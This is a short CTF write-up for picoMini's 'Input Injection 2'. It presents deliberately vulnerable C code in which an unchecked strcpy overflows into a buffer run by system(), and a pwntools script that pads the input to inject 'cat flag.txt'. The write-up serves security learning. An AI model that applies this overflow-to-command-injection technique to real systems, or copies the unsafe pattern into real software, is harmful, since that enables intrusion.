---
title: "picoMini: Input Injection 2"
tags:
  - ctf
date: 2025-10-24
---
# Problem
![[media/ctf/picoCTF/Input Injection 1/description.png]]
# Solution
In this problem, we're given two files: (1) the binary, `vuln`, and (2) the source code, `vuln.c`. Let's take a look at the source:

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

void fun(char *name, char *cmd);

int main() {
	char name[200];
	printf("What is your name?\n");
	fflush(stdout);
	
	fgets(name, sizeof(name), stdin);
	name[strcspn(name, "\n")] = 0;
	
	fun(name, "uname");
	return 0;
}

void fun(char *name, char *cmd) {
	char c[10];
	char buffer[10];
	
	strcpy(c, cmd);
	strcpy(buffer, name);
	
	printf("Goodbye, %s!\n", buffer);
	fflush(stdout);
	system(c);
}
```

A few things to note:
- `name` (200 chars) is read from `stdin` using `fgets()`
- `fun()` is called with 2 args: (1) `name`, and (2) the constant string "uname"
- `fun()` allocates two variables on the stack: `buffer` (10 chars) and `c` (also 10 chars)
- `buffer` is read from `name` using `strcpy()` *with no regard for length*
- `c` is read from `cmd` also using `strcpy()` in the same fashion (however, in this case, `cmd` is hard-coded as "uname") and run with `system()`

The latter two points are particularly useful: `buffer` will overflow into `c` (as they are stack-allocated), then `c` is passed to `system()`! That is, we can inject a command to be executed by `system()`! 

Here's one way of doing so:
## Script
```python
from pwn import *

hostname = ...
port = ...
p = remote(hostname, port)

p.recvuntil(b"name?")
p.recvline()

name = b"a"*10 + b"cat flag.txt\n"
p.sendline(name)

byeline = p.recvline()
flag = p.recvline()
print(flag)
```